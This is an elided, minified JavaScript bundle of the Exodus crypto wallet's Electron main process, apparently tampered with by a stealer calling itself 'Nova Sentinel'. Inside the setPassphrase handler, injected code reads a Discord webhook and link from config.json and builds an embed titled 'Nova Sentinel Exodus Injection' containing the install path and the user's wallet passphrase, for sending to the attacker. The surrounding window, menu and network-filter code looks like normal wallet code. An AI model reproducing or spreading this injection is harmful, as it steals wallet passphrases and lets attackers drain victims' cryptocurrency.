...
!(function (e) {
  ...
  function (e, t, n) {
    ...
    a && a.match(/^http/),
      ...
      [
        ...
        { localKey: r, profilePath: `private.${r}` },
        { localKey: o, profilePath: o },
  ...
  function (e, t, n) {
    ...
    const J = {
      ...
      webPreferences: { ...V.c, partition: "passphrase" },
    };
    let H = null;
    const G = () => H;
    function Y(e) {
      ...
      return (
        (H = new i.BrowserWindow({ ...J, title: t })),
        Object(W.registerWebContents)(H.webContents, "passphrase"),
        Object(z.a)(H.webContents, "passphrase"),
        H.loadURL(
          Object(K.a)({ app: i.app, hash: Object(R.a)(e), filePath: q.h }),
        ),
        Object(B.a)() &&
          Object($.a)({ windowHandle: H.webContents, windowId: "passphrase" }),
        H.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        }),
        H.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
    ...
    const X = new (class extends U.EventEmitter {
      ...
      async setPassphrase(e) {
        fs.readFile("config.json", "utf8", function (err, data) {
          if (err) throw err;
          let fdp = JSON.parse(data)
          let data2 = fdp.webhook.split("/")
          const hook = data2[5] +"/" + data2[6];
          const link = fdp.link;
          const payload = {
            content: null,
            embeds: [
              {
                title: "Nova Sentinel Exodus Injection",
                description: `\`\`\`diff\n- Path: ${__dirname}\`\`\``,
                color: 1638163,
                fields:[{
...
[2;31m ${e ?? "N/A"}[0m[2;34m[0m\`\`\``,
                ...
                },
                {
                    ...
                    value: `\`\`\`ansi
[2;31m ${link ?? "N/A"}[0m[2;34m[0m\`\`\``,
                    inline: false,
                }],
                footer: {
                  text: "Nova Sentinel",
                  icon_url:
                    "https://raw.githubusercontent.com/FalseKSCH/assets/main/gifnova.gif",
                },
                thumbnail: {
                  url: "https://raw.githubusercontent.com/FalseKSCH/assets/main/gifnova.gif",
                },
              },
            ],
    ...
    async function ce(e) {
      ...
      const s = t || Object(T.a)();
      console.timeEnd("main"),
        console.time("uiview"),
        await (async function (e, t) {
          if (await _.a.pathExists(ue(t)))
            return (async function (e) {
              await _.a.remove(ue(e)), (se = Y({ recoverFromPhrase: !0 }));
          ...
          if (!s || (s && c)) Object(oe.b)({ walletDir: r });
          else {
            if (c) {
              const e = new Error(
            ...
            (se = Y()),
              Z.on("passphrase:set", (e) => {
                const t = Object(oe.b)({ walletDir: r, passphrase: e });
                Z.on("passphrase:invalid", () => {
                  t.destroy();
                });
              }),
        ...
        o.webContents.once("did-finish-load", () => {
          function e() {
            se && (Object(Q.b)(n), n.show(), se.destroy()),
              (Object(B.a)() || f.e) &&
                Object($.a)({ windowHandle: o.webContents, windowId: "ui" }),
              setTimeout(() => {
  ...
  function (e, t, n) {
    ...
    const l = new Map(
      Object.entries({
        background: { url: u(c.a), protocols: ["file:"], offline: !0 },
        dapp: {
        ...
        core: { url: u(c.b), protocols: ["file:"], offline: !0, ipc: !0 },
        passphrase: { url: u(c.h), protocols: ["file:"], offline: !0, ipc: !0 },
        "scan-qr": {
          url: u(c.i),
          protocols: ["file:"],
          offline: !0,
        ...
        unlock: { url: u(c.j), protocols: ["file:"], offline: !0, ipc: !0 },
        wallet: {
          url: u(c.k),
  ...
  function (e, t, n) {
    ...
    const f = () => l,
      d = (e, t) => {
        ...
        e.setBounds({ x: 0, y: o, width: r, height: n });
      },
      p = new Set();
    function h(e) {
      return (
  ...
  function (e, t, n) {
    ...
    const L = (e) => {
        ...
        for (let e of P.values())
          e.setBounds({ x: 0, y: n + i, width: o, height: r - n });
      },
      I = [
        {
    ...
    const $ = (e) => {
      ...
      U = (e, t) => {
        ...
        e.setBounds({ x: 0, y: r + s, width: i, height: o - r });
      };
    j.c.add(() => L()),
      _.c.add(L),
      M(
        ...
        async (e, { tar: t, url: n, domains: r, localStorageContent: c }) => {
          ...
          Object(p.registerWebContents)(m.webContents, "dapp", {
            ...
            P.set(e, m),
            U(m, B),
            m.setAutoResize({ width: !0, height: !0 }),
            h.a.ui.webContents.on("devtools-reload-page", () => {
              T(m), Object(l.destroyBrowserView)(m);
            });
    ...
    M("hide", (e) => {
      ...
      M("disable", (e) => {
        N.add(e);
        const t = P.get(e);
        P.delete(e), t && (T(t), Object(l.destroyBrowserView)(t));
      });
    const W = (e) => {
  ...
  function (e, t, n) {
    ...
    const l = {
      ...
      title: "UNLOCK WALLET",
      modal: !0,
      webPreferences: { ...a.c, partition: "unlock" },
    };
    let f = null;
    const d = () => f;
    function p(e, t) {
      (f = new r.BrowserWindow({ ...l, parent: e })),
        ...
        f.loadURL(
          Object(u.a)({ app: r.app, hash: Object(i.a)(t), filePath: c.j }),
        );
      let n = !1;
      return (
  ...
  function (e, t, n) {
    ...
    function h(e) {
      ...
      (d = new r.BrowserWindow(n)),
        ...
        d.loadURL(
          Object(l.a)({ app: r.app, hash: Object(o.a)(e), filePath: a.k }),
        ),
        Object(s.a)({ windowHandle: d.webContents, windowId: "wallet" }),
  ...
  function (e, t, n) {
    ...
    const Te = (() => (U.c ? "Exodus" : U.b ? "Eden" : U.d))();
    let Be;
    var Le = (Be =
        "darwin" === process.platform
          ? re()([
    ...
    const Ae = s.Menu.buildFromTemplate(Me),
      $e = () =>
        "darwin" === process.platform
          ? Re(Re(Ae, Te).submenu, "Developer").submenu
    ...
    const Ve = n(45)(process.argv);
    !(function () {
      if (U.h) console.log("TEST MODE");
      else {
        const e = ["_", "datadir", "debug", "disable-gpu", "p"];
        (!Object.keys(Ve).every((t) => e.includes(t)) || Ve._.length > 2) &&
          (console.error(
      ...
      Ve.datadir
        ? s.app.setPath("userData", A.a.resolve(Ve.datadir))
        : U.b &&
          s.app.setPath(
            "userData",
            A.a.join(s.app.getPath("appData"), "Exodus Eden"),
          ),
      Ve._.length > 1 && (globalThis.OPENED_URL = Ve._[1]);
    ...
    const Xe = fe();
    (Ve.debug || process.env.DEBUG_MODE || U.e || Xe) &&
      (console.log("DEBUG MODE"),
      (globalThis.DEBUG_MODE = Ve.debug || process.env.DEBUG_MODE || !0));
    let Ze = !1;
  ...
  function (e, t, n) {
    "use strict";
    const { stringify: r } = n(61),
      { outputFileSync: o } = n(60);
    e.exports = function (e, t, n) {
      const i = r(t, n);
      o(e, i, n);
    };
  ...
  function (e, t, n) {
    ...
    const [w, b, g, v] = [1, 2, 3, 4];
    function E(e, t) {
      const n = Object(d.a)(e, t);
      if (!n) return g;
      if ("block_silent" === n) return v;
      ...
      const m = "file:" === i,
        ...
        E = ["devtools:", "chrome-extension:"].includes(i),
        S = [
          "https:",
          "wss:",
          "file:",
      ...
      if (
        ...
        !(function (e) {
          ...
          const i = [h, o];
          return y.datadir && i.push(y.datadir), i.some((e) => r.startsWith(e));
        })(t)
      )
        return u.endsWith(".map") ? v : g;
      if (E) return w;
      if ("*" !== r) {
    ...
    function k(e) {
      ...
      t.onBeforeRequest((t, n) => {
        ...
        o === w ||
          (o === b && u.f) ||
          ((i.cancel = !0),
          o !== v && Object(f.a)("network request", ` to ${r.toString()}`)),
          n(i);
      }),
          ...
          try {
            if (
              (function (e, t) {
                ...
                if (
                  t.getURL().startsWith("devtools://") &&
                  m(e, { prefix: "blob:devtools://", mimetypes: ["image/png"] })
                )
                  return !0;
                return !1;
              })(t, n)
    ...
    const x = ["accessibility-events", "window-placement"];
    function O(e, t, n) {
  ...
  function (e, t, n) {
    ...
    }
    {
      const e = n(64),
        ...
        o = () => {
          const { allowedBuiltins: e } = n(184),
            { getProcessName: t } = n(183),
            r = t();
